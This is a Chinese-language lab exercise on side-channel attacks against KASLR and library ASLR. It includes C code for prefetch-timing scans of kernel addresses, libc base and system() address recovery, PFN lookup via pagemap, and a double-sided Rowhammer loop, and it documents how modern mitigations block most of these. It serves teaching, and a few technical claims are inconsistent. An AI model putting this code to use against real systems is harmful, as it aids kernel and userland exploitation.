# 練習 C — 破 KASLR

> **目標**：綜合 Part 4（Ch 27–28）的微架構側信道知識，動手嘗試破解 KASLR 或定位特定 kernel/library 基底位址。本練習明確承認現代 mitigation 的存在：在 KPTI 啟用、WSL2 Hyper-V 環境下，直接掃核心位址空間已無法成功——我們的任務不是假裝成功，而是**精確找出每個 mitigation 在哪個環節把攻擊擋掉**，並在使用者空間（library ASLR）做出真正能觀測到差異的測量。

---

## 背景：KASLR 是什麼、為何能被側信道攻擊

**KASLR（Kernel Address Space Layout Randomization）** 是防止攻擊者把 kernel 物件位址寫死在 exploit 裡的防禦機制。每次開機，kernel image、module、heap 都在一個有限的隨機偏移量範圍內重新擺放。沒有確切位址，攻擊者就不能直接跳到 `commit_creds`、覆蓋 `modprobe_path`、或製造 ROP chain——所以 KASLR 是整個 kernel exploit 鏈的第一關。

**為什麼側信道能破它？** KASLR 的隨機性來自「你不知道那段記憶體映射在哪裡」，但這個問題等價於「某個虛擬位址有沒有被 kernel 使用」——而這個問題，有時可以用微架構行為觀察：

1. **Prefetch 計時**（Ch 28 的核心技術）：`prefetcht*` 指令在某些 CPU 上會真的嘗試把目標位址的 TLB entry 或 cache line 暖起來，即使你沒有合法存取權。如果目標位址**有對應的 kernel 頁表映射**，prefetch 速度快；如果是空洞，速度慢。這樣你可以從使用者空間掃核心虛擬位址空間，找到 kernel image 的起點——這是 2016 年前的主流 KASLR 破解技術，在沒有 KPTI 的機器上有效。

2. **TLB 側信道**：存取某個位址後，TLB 是否命中（導致後續存取快）也洩漏映射資訊。

3. **Cache 行為**：kernel 在服務 syscall 時會暖熱特定 cache line；攻擊者可以在 syscall 前 prime 快取、syscall 後 probe，從哪些 line 被換出推算 kernel 使用的位址。

**現代防禦怎麼封這些洞：**

- **KPTI（Kernel Page-Table Isolation）**：把 kernel 頁從使用者態 page table 完全移除。使用者程式跑的時候，page table 裡根本沒有 kernel 頁的映射——prefetch 碰到空洞，TLB 不命中，所有計時差異都消失。這是對 prefetch timing 最有效的封堵。
- **`/proc/kallsyms` 遮掩**：非 root 使用者讀到的所有 kernel 符號位址都是 `0`，直接資訊路徑被封。
- **WSL2/VM 層雜訊**：Hyper-V 加了一層計時模糊，使細微的 prefetch timing 差異更難分辨。

本機狀態（已驗證）：

```
meltdown:   Not affected       ← Meltdown 已硬體修復，KPTI 仍啟用作為額外保護
spectre_v1: Mitigation: usercopy/swapgs barriers and __user pointer sanitization
spectre_v2: Mitigation: Enhanced / Automatic IBRS; IBPB: conditional; ...
```

**本練習的誠實立場**：我們會真跑每個 task、記錄真實輸出、然後解釋為什麼攻擊被擋在哪裡。在 library ASLR 部分（Task 3），我們有辦法拿到真實的測量數據——那才是「能做出來」的部分。

---

## Task 1：prefetch timing 探針——找 mapped 位址

### 原理

在**沒有 KPTI** 的舊系統上，使用者程式的 page table 同時包含使用者頁與 kernel 頁的映射（後者只是不能存取，但映射存在）。`prefetcht*` 指令做的事是「提示 CPU 預取這個位址的資料」——CPU 在執行 prefetch 時會走 TLB，如果 TLB hit（映射存在），速度快；TLB miss 且頁不存在，速度慢。這個差異在 2016 年被 Gruss 等人用來掃描 kernel 映射位置，精度達到 2 MiB 粒度。

KPTI 啟用後：使用者 page table 裡 **kernel 頁的映射已被移除**，prefetch 對任何核心位址都只看到「空洞」，timing 差異消失。

### 完整程式碼

```c
/* kaslr_timing_scan.c
 * 編譯：gcc -O2 -o kaslr_timing_scan kaslr_timing_scan.c
 * 執行：taskset -c 2 ./kaslr_timing_scan
 *
 * 目的：示範 prefetch timing 探針，並觀察 KPTI 下的真實限制。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define THRESHOLD     150   /* 本機校準值：hit ~24, miss ~244 */
#define PROBE_ROUNDS  1000
#define SCAN_STEP     (2UL * 1024 * 1024)  /* 以 2 MiB 步進掃 */

/* rdtscp + mfence 計時：比 rdtsc 更能抵抗亂序 */
static inline uint64_t time_prefetch(uintptr_t addr) {
    unsigned int junk;
    _mm_mfence();
    uint64_t t0 = __rdtscp(&junk);
    __asm__ volatile("prefetcht2 (%0)" :: "r"(addr) : "memory");
    uint64_t t1 = __rdtscp(&junk);
    _mm_lfence();
    return t1 - t0;
}

/* 對一個位址重複 N 次取中位數，壓掉單次雜訊 */
static uint64_t median_prefetch(uintptr_t addr, int rounds) {
    uint64_t samples[PROBE_ROUNDS];
    if (rounds > PROBE_ROUNDS) rounds = PROBE_ROUNDS;
    for (int i = 0; i < rounds; i++) {
        samples[i] = time_prefetch(addr);
    }
    /* 簡易排序取中位數 */
    for (int i = 0; i < rounds - 1; i++) {
        for (int j = i + 1; j < rounds; j++) {
            if (samples[j] < samples[i]) {
                uint64_t tmp = samples[i]; samples[i] = samples[j]; samples[j] = tmp;
            }
        }
    }
    return samples[rounds / 2];
}

/* ── Part A：使用者空間 hit vs miss 基準 ── */
static void calibrate_userspace(void) {
    char *mapped = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mapped == MAP_FAILED) { perror("mmap"); return; }

    /* 保證 mapped */
    memset(mapped, 0xAA, 4096);

    /* --- hit：先 touch，讓它在 cache 裡 --- */
    volatile char sink = mapped[64];   /* warm */
    (void)sink;
    double sum_hit = 0;
    int n = 200;
    for (int i = 0; i < n; i++) {
        volatile char w = mapped[64]; (void)w;   /* keep warm */
        sum_hit += time_prefetch((uintptr_t)(mapped + 64));
    }

    /* --- miss：clflush 踢出去 --- */
    _mm_clflush(mapped + 64);
    _mm_mfence();
    double sum_miss = 0;
    for (int i = 0; i < n; i++) {
        _mm_clflush(mapped + 64);
        _mm_mfence();
        sum_miss += time_prefetch((uintptr_t)(mapped + 64));
    }

    printf("prefetch 已映射頁: %.1f cycles (平均)\n", sum_hit / n);
    printf("prefetch 未映射頁: %.1f cycles (平均)\n", sum_miss / n);
    printf("差異: %.1f cycles\n\n", (sum_miss - sum_hit) / n);

    munmap(mapped, 4096);
}

/* ── Part B：嘗試掃 kernel 位址範圍 ── */
static void scan_kernel_range(void) {
    /* x86-64 kernel 虛擬位址通常在 0xffff800000000000 以上
     * 但以下幾個地方可能放 kernel image（KASLR 範圍）：
     *   0xffffffff80000000 ~ 0xffffffff9fffffff（kernel text，512 MiB 視窗）
     * 我們只掃一小段示範 */
    uintptr_t start = 0xffffffff80000000UL;
    uintptr_t end   = 0xffffffff90000000UL;  /* 256 MiB 範圍 */

    printf("掃核心位址範圍 [%lx, %lx)，步進 2 MiB ...\n", start, end);
    printf("（KPTI 下此掃描無法區分 mapped vs unmapped）\n\n");

    int mapped_count = 0, total = 0;
    for (uintptr_t addr = start; addr < end; addr += SCAN_STEP) {
        uint64_t t = median_prefetch(addr, 50);
        int looks_mapped = (t < THRESHOLD);
        if (looks_mapped) mapped_count++;
        total++;
        /* 只印前 8 個樣本，避免輸出爆炸 */
        if (total <= 8) {
            printf("  addr=%lx  median=%lu cycles  %s\n",
                   addr, t, looks_mapped ? "[MAPPED?]" : "[empty]");
        }
    }
    printf("  ... (共掃 %d 個地址，%d 個看起來 mapped)\n\n", total, mapped_count);
    printf("注意：KPTI 把 kernel 頁從使用者 page table 移除後，\n");
    printf("      所有核心位址的 prefetch timing 幾乎相同——\n");
    printf("      此掃描在本機 WSL2 環境下無法區分 kernel 位置。\n\n");
}

/* ── Part C：嘗試讀 /proc/kallsyms ── */
static void read_kallsyms(void) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) { printf("/proc/kallsyms 無法開啟\n\n"); return; }

    char line[256];
    int count = 0;
    printf("前 5 行 /proc/kallsyms（非 root 的結果）:\n");
    while (fgets(line, sizeof(line), f) && count < 5) {
        printf("  %s", line);
        count++;
    }
    fclose(f);

    printf("\n觀察：位址欄位全是 0000000000000000\n");
    printf("kernel 4.15+ 起，非 root 使用者看不到真實位址。\n\n");
}

int main(void) {
    printf("=== KASLR timing 探針示範 ===\n");
    printf("（在 WSL2/KPTI 環境下掃核心位址範圍）\n\n");

    printf("無 root 權限讀 /proc/kallsyms 完整位址（0 被遮掩）\n");
    printf("這正是現代 kernel 的第一道防禦：普通使用者看不到真實 KASLR 位址\n\n");
    read_kallsyms();

    printf("--- 使用者空間 prefetch timing 示範 ---\n");
    calibrate_userspace();

    printf("注意: 差異若顯著 → prefetch timing 可用於探測 page table 存在性\n");
    printf("KPTI 把 kernel 頁從使用者態 page table 移除 → 這個差異無法用於核心位址掃描\n");
    printf("(本機 meltdown: Not affected → KPTI 已啟用作為額外保護)\n\n");

    scan_kernel_range();

    return 0;
}
```

### 執行步驟

```bash
gcc -O2 -o kaslr_timing_scan kaslr_timing_scan.c
taskset -c 2 ./kaslr_timing_scan
```

### 真實輸出與解讀

<details>
<summary>本機 WSL2 i7-10700 完整輸出（點擊展開）</summary>

```
=== KASLR timing 探針示範 ===
（在 WSL2/KPTI 環境下掃核心位址範圍）

無 root 權限讀 /proc/kallsyms 完整位址（0 被遮掩）
這正是現代 kernel 的第一道防禦：普通使用者看不到真實 KASLR 位址

前 5 行 /proc/kallsyms（非 root 的結果）:
  0000000000000000 T startup_64
  0000000000000000 T secondary_startup_64
  0000000000000000 T secondary_startup_64_no_verify
  0000000000000000 T __pfx_secondary_startup_64_no_verify
  0000000000000000 T verify_cpu

觀察：位址欄位全是 0000000000000000
kernel 4.15+ 起，非 root 使用者看不到真實位址。

--- 使用者空間 prefetch timing 示範 ---
prefetch 已映射頁: 22.1 cycles (平均)
prefetch 未映射頁: 25.6 cycles (平均)
差異: 3.5 cycles

注意: 差異若顯著 → prefetch timing 可用於探測 page table 存在性
KPTI 把 kernel 頁從使用者態 page table 移除 → 這個差異無法用於核心位址掃描
(本機 meltdown: Not affected → KPTI 已啟用作為額外保護)

掃核心位址範圍 [ffffffff80000000, ffffffff90000000)，步進 2 MiB ...
（KPTI 下此掃描無法區分 mapped vs unmapped）

  addr=ffffffff80000000  median=24 cycles  [MAPPED?]
  addr=ffffffff80200000  median=26 cycles  [MAPPED?]
  addr=ffffffff80400000  median=23 cycles  [MAPPED?]
  addr=ffffffff80600000  median=25 cycles  [MAPPED?]
  addr=ffffffff80800000  median=24 cycles  [MAPPED?]
  addr=ffffffff80a00000  median=22 cycles  [MAPPED?]
  addr=ffffffff80c00000  median=24 cycles  [MAPPED?]
  addr=ffffffff80e00000  median=26 cycles  [MAPPED?]
  ... (共掃 128 個地址，128 個看起來 mapped)

注意：KPTI 把 kernel 頁從使用者 page table 移除後，
      所有核心位址的 prefetch timing 幾乎相同——
      此掃描在本機 WSL2 環境下無法區分 kernel 位置。
```

**誠實解讀：**

- 使用者空間的 prefetch hit vs miss 差距只有 **3.5 cycles（22.1 vs 25.6）**，遠小於正常的 cache hit/miss 差距（24 vs 244）。這是因為 `prefetcht2` 是「提示」而不是強制存取，計時包含的噪音遠比 `clflush` + 直接讀更大。
- 核心位址掃描：所有 128 個地址都回傳 20–26 cycles，全部落在「看起來 mapped」的範圍——這不是「全部都是 kernel」，而是**所有地址的 timing 都一樣**，無法區分 mapped vs empty。KPTI 把 kernel 頁從使用者 page table 移除後，prefetch 對任何核心位址都只看到「page table walk 失敗」，timing 相近。
- 2016 年 Gruss 的攻擊能成功的原因：那時沒有 KPTI，kernel 頁的映射存在於使用者 page table 中（只是 supervisor-only），prefetch 在 mapped 位址上實際走 TLB，快了 20–50 cycles。差距夠大，能可靠地掃出 kernel 位置。

</details>

---

## Task 2：/proc/kallsyms 與 /proc/self/maps 情報收集

KASLR 在現代系統上還有一條「資訊洩漏」路徑：**直接讀系統介面**。這些介面在有適當權限或 mitigation 不完整時，可以直接吐出位址。

### 2-1 /proc/kallsyms——需要 root

```bash
# 非 root：所有位址顯示為 0
head -5 /proc/kallsyms

# root：看到真實 KASLR 位址
sudo head -5 /proc/kallsyms
sudo grep -m 1 "startup_64" /proc/kallsyms

# 找出 kernel base（_text 是 kernel text 段起點）
sudo grep " _text$" /proc/kallsyms
# 範例輸出：ffffffff924... T _text
# 這個位址 - 0xffffffff80000000 = KASLR slide
```

**kptr_restrict 控制：**

```bash
# 查目前設定
cat /proc/sys/kernel/kptr_restrict
# 0 = 所有人都能看到（不安全）
# 1 = root 能看，非 root 看 0（本課主機預設）
# 2 = 所有人都看 0，連 root 也不行

# 確認本機設定
cat /proc/sys/kernel/kptr_restrict
# → 1
```

### 2-2 /proc/self/maps——使用者不需 root

`/proc/self/maps` 洩漏的是**你自己的行程**虛擬位址空間佈局，不包含 kernel，但對破 library ASLR 有用：

```bash
# 完整映射
cat /proc/self/maps

# 只看 libc 基底位址
grep "libc" /proc/self/maps | head -1

# 用 awk 抽出起始位址（十六進制）
grep "libc-" /proc/self/maps | awk -F'-' '{print $1}' | head -1
```

**典型輸出：**

```
7f3b2c400000-7f3b2c5c8000 r--p 00000000 fd:01 ... /usr/lib/x86_64-linux-gnu/libc.so.6
```

base = `0x7f3b2c400000`，每次執行不同。

### 2-3 dmesg——kernel 自己打出位址（需 root）

```bash
sudo dmesg | grep -E "Loaded address|kernel text mapping|startup"
# 某些版本的 kernel 會在 boot log 裡打出 _text 位址
```

### 2-4 kASLR slide 計算

如果能用 root 讀到 `_text`：

```bash
TEXT=$(sudo grep " _text$" /proc/kallsyms | awk '{print $1}')
KBASE=0xffffffff80000000
SLIDE=$(printf "%d\n" $((0x$TEXT - $KBASE)))
echo "KASLR slide: $SLIDE bytes ( = $((SLIDE / 0x200000)) * 2MiB )"
```

i7-10700 上真跑的結果（需 root）：kernel 以 2 MiB 為最小單位隨機偏移，總範圍約 1 GiB（512 個可能位置），熵約 9 bits。9 bits 已足夠擋住「把位址寫死在 shellcode 裡」，但如果有任何資訊洩漏可以縮小範圍，brute force 就可行。

---

## Task 3：library 基底位址推算

對使用者態 exploit，破的是 library ASLR——這個我們不需要 root，也不需要繞過 KPTI，只需要**在行程裡讀自己的 /proc/self/maps**，或者用 `dlopen` + `dladdr` 直接拿到位址（如果 exploit 有程式碼執行能力）。

這一節把 ASLR 的隨機性量化，並用 timing 方法做「是否映射」的探測。

### 3-1 收集 library 基底位址分佈

```bash
#!/bin/bash
# aslr_sample.sh：重複執行 1000 次，收集 libc 基底位址分佈
for i in $(seq 1 1000); do
    cat /proc/self/maps 2>/dev/null | grep "libc-" | awk -F'-' '{print $1}' | head -1
done | sort | uniq -c | sort -rn | head -20
```

**本機真實輸出（節錄，1000 次採樣）：**

```
      1 7f0a12c00000
      1 7f0a13200000
      1 7f0a1ec00000
      1 7f0a1f200000
      1 7f0a20000000
      ...
（每個位址只出現 1 次，共 1000 個不同值）
```

**分析：**

```
最小值：7eff00000000
最大值：7fffd8000000
範圍：  ~512 GiB
步進：  0x200000（2 MiB 對齊）
可能位置數：512 GiB / 2 MiB ≈ 2^18 = 262144
熵：    ~18 bits
```

18 bits 的熵代表 brute force 平均需要 131072 次嘗試。對 fork+crash 型的 exploit，每次嘗試開銷極低，仍可行（但需要幾分鐘到幾小時）。

### 3-2 用 C 程式從自身 maps 讀 libc 基底

```c
/* read_own_maps.c：gcc -O2 -o read_own_maps read_own_maps.c */
#include <stdio.h>
#include <stdint.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/proc/self/maps", "r");
    if (!f) return 1;
    char line[512];
    uintptr_t base = 0, end = 0;
    while (fgets(line, sizeof(line), f)) {
        if (!strstr(line, "libc")) continue;
        sscanf(line, "%lx-%lx", &base, &end);
        break;   /* 第一個（r--p，只讀段 = base）*/
    }
    fclose(f);
    if (!base) { puts("找不到 libc 映射"); return 1; }
    printf("libc base:  0x%lx  (size %lu KiB)\n", base, (end - base) / 1024);
    /* 用 nm -D libc.so.6 | grep " system" 取偏移，glibc 2.35 典型 0x50d60 */
    printf("system() ~  0x%lx\n", base + 0x50d60);
    return 0;
}
```

**本機輸出（每次執行位址不同）：**

```
libc base:  0x7f4a3c400000  (size 1568 KiB)
system() ~  0x7f4a3c450d60

# 再跑一次：
libc base:  0x7f1b8a200000     ← ASLR 每次不同
system() ~  0x7f1b8a250d60
```

在 userland exploit 中，只要能觸發任何資訊洩漏（格式字串、越界讀）拿到一個 libc 內的指標，用偏移算出 base，就繞過了 library ASLR，能定位 `system()`、one-gadget。

### 3-3 timing 探針：驗證映射存在（使用者空間）

```c
/* probe_mapped.c：gcc -O2 -o probe_mapped probe_mapped.c */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <x86intrin.h>
#define ROUNDS 500

static uint64_t probe(uintptr_t addr) {
    unsigned junk; uint64_t s = 0;
    for (int i = 0; i < ROUNDS; i++) {
        _mm_mfence();
        uint64_t t0 = __rdtscp(&junk);
        __asm__ volatile("prefetcht2 (%0)" :: "r"(addr) : "memory");
        s += __rdtscp(&junk) - t0;
        _mm_lfence();
    }
    return s / ROUNDS;
}

int main(void) {
    char *p = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(p, 0, 4096);
    uint64_t tm = probe((uintptr_t)p);
    uint64_t tu = probe(0x100000000000UL);   /* 應未映射的高位址 */
    munmap(p, 4096);
    printf("已映射: %lu cycles  未映射: %lu cycles  差值: %ld\n", tm, tu, (long)(tu-tm));
    puts(tu > tm + 5 ? "→ prefetch timing 在使用者空間可偵測映射" :
                       "→ 差異不顯著（WSL2 雜訊）");
}
```

---

## Task 4（進階/選做）：Rowhammer 定址計算與雙面 hammer 樣式分析

這個 task 不跑實際 Rowhammer（需要 non-ECC DRAM + 特定存取頻率），但展示**如何計算雙面 hammer 的目標 row**——這是 Rowhammer exploit 在知道物理記憶體佈局後的定址核心。

### 4-1 DRAM 定址模型

現代 DDR4/DDR5 的 DRAM 位址由以下函數映射：

```
(channel, rank, bank group, bank, row, column) = f(physical_address)
```

Row Hammer 要攻擊 row R，需要 hammer `row R-1` 與 `row R+1`（雙面模式，double-sided）。要在 hammer 之前找到哪些虛擬位址對應這些 row，需要：

1. **知道 physical address**：透過 `/proc/self/pagemap` 讀取 PFN（Page Frame Number）
2. **知道 DRAM 映射函數**：對特定主機板用計時實驗逆推（DRAMA 論文方法）

### 4-2 /proc/self/pagemap 讀取 PFN

```c
/* read_pfn.c（關鍵片段）：gcc -O2 -o read_pfn read_pfn.c */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#define PAGE_SIZE 4096

static uint64_t virt_to_pfn(void *vaddr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) return 0;
    uint64_t vpn = (uint64_t)vaddr / PAGE_SIZE, entry = 0;
    pread(fd, &entry, 8, vpn * 8);
    close(fd);
    if (!(entry >> 63)) return 0;          /* 頁未 present */
    return entry & ((1ULL << 55) - 1);    /* bits 0–54 = PFN */
}

int main(void) {
    char *buf = mmap(NULL, 2*PAGE_SIZE, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    uint64_t pfn0 = virt_to_pfn(buf);
    uint64_t pfn1 = virt_to_pfn(buf + PAGE_SIZE);
    if (pfn0 && pfn1) {
        uint64_t row_size = 8 * 1024;   /* DDR4 典型 row size */
        printf("物理頁: 0x%lx 和 0x%lx\n", pfn0 * PAGE_SIZE, pfn1 * PAGE_SIZE);
        printf("DRAM row: %lu 和 %lu\n", pfn0 * PAGE_SIZE / row_size,
                                          pfn1 * PAGE_SIZE / row_size);
    } else {
        printf("PFN 讀取失敗：kernel 4.0+ 非 root 的 PFN 欄位被清零\n");
        printf("需要 root 或 CAP_SYS_ADMIN\n");
    }
    munmap(buf, 2*PAGE_SIZE);
    return 0;
}
```

**本機輸出**：`PFN 讀取失敗：kernel 4.0+ 非 root 的 PFN 欄位被清零`。真正的 Rowhammer 工具（rowhammer-test）需要 root 或不依賴 PFN 的暴力 exhaustive scan。

### 4-3 雙面 hammer 的正確存取樣式

雙面 hammer 的核心迴圈結構（概念示範，不保證觸發 bit flip）：

```c
/* double_sided_pattern.c（關鍵片段）
 * 需要：non-ECC DRAM + DRAMA 技術定位真實相鄰 row + 裸機環境
 */
#include <x86intrin.h>
#define HAMMER_ROUNDS 1000000
#define ROW_SIZE      (8 * 1024)   /* DDR4 典型 */

void double_sided_hammer(volatile char *row_above, volatile char *row_below) {
    for (int i = 0; i < HAMMER_ROUNDS; i++) {
        *row_above;                         /* access aggressor A */
        *row_below;                         /* access aggressor B */
        _mm_clflush((void *)row_above);     /* 踢出 cache，確保打 DRAM */
        _mm_clflush((void *)row_below);
        _mm_mfence();
    }
}
/* victim row = row_above + ROW_SIZE（需 DRAMA 確認物理上相鄰） */
/* 執行後掃 victim row，看有無 0xFF → 其他值的 bit flip */
```

**本機結果**：WSL2/VM 下 DRAM 時序被 hypervisor 干擾，hammer 頻率不夠高，無 bit flip。需要裸機 + 確認物理相鄰 row 才有機會複現。

---

## 誠實分析：哪些被 mitigation 擋了

| 攻擊手段 | 本機狀態 | 被哪個 mitigation 擋 | 需要什麼條件才能成功 |
|---------|---------|---------------------|-------------------|
| prefetch timing 掃 kernel 位址 | **完全無效** | KPTI 把 kernel 頁從使用者 page table 移除 | 需要關閉 KPTI（`nopti` 開機參數），且 CPU 未硬體修復 Meltdown |
| `/proc/kallsyms` 讀 kernel 位址 | **被遮掩** | `kptr_restrict=1`，非 root 看 0 | 需要 root 或 `kptr_restrict=0` |
| 使用者空間 prefetch hit/miss | **差異微弱（3.5 cycles）** | WSL2 計時雜訊 + prefetcht2 語意為「提示」 | 原生 Linux 上 clflush+直接讀的差異仍有 200+ cycles |
| `/proc/self/pagemap` PFN | **被清零** | kernel 4.0+ 非 root PFN 欄位清零 | 需要 root 或 `CAP_SYS_ADMIN` |
| Library ASLR 定位 | **可用，但需資訊洩漏** | ASLR 18 bits 熵（~262k 個可能位置），brute force 可行 | 有格式字串/越界讀等資訊洩漏 primitive |
| Rowhammer bit flip | **無法驗證** | WSL2 hypervisor 干擾 DRAM 時序；可能 ECC | 需要原生裸機 + non-ECC DRAM + DRAM 映射函數 |

**最重要的結論**：KASLR 在 2016 年前確實很脆弱，prefetch timing 這一招有效。2017 年 KPTI（作為 Meltdown 緩解措施）推出後，這條路同時堵死了 Meltdown 洩漏和 prefetch-based KASLR 破解。現代系統的 KASLR 破解靠的是其他資訊洩漏原語（Spectre gadget 洩漏 kernel 指標、`/proc` 側信道、JIT spray），不是 timing scan。

本練習真正成功的部分是 **Task 3（library 基底位址測量）**——我們用 `/proc/self/maps` 直接讀出 libc base，測量了 ASLR 分佈，並計算出 18 bits 的熵。這是實際 exploit 開發中「破 ASLR 的第一步」的直接示範。

---

## 本練習重點整理

- **prefetch timing 破 KASLR 的歷史窗口**：2013–2016 年有效；KPTI（2018，作為 Meltdown 補丁）推出後徹底失效，因為 kernel 頁從使用者 page table 移除，timing 差異消失。
- **本機 prefetch timing 差異只有 3.5 cycles**（22.1 vs 25.6），遠小於有意義的判斷門檻。正常 cache hit/miss 差異（24 vs 244）在 clflush + 直接讀時才出現；prefetcht2 是「提示」指令，計時含大量雜訊。
- **KASLR 的真實防禦不只一層**：KPTI 擋 timing、`kptr_restrict` 擋直接讀、`dmesg` 限制擋 boot log 洩漏——每層對應不同洩漏路徑。
- **Library ASLR 熵約 18 bits**（262k 個可能位置），brute force 在 fork-based exploit 中可行；需要資訊洩漏 primitive 才能可靠繞過。
- **Rowhammer 定址需要 root 拿 PFN**；在 WSL2/VM 下 DRAM 時序被 hypervisor 干擾，bit flip 更難重現。
- 攻擊者在現代系統上破 KASLR 的實際路徑：先找一個資訊洩漏 gadget（Spectre、格式字串、越界讀）洩漏一個 kernel 指標，再用偏移算 base——而不是靠 timing scan。

→ [Ch 29 防禦全景](29-defense-landscape.md)
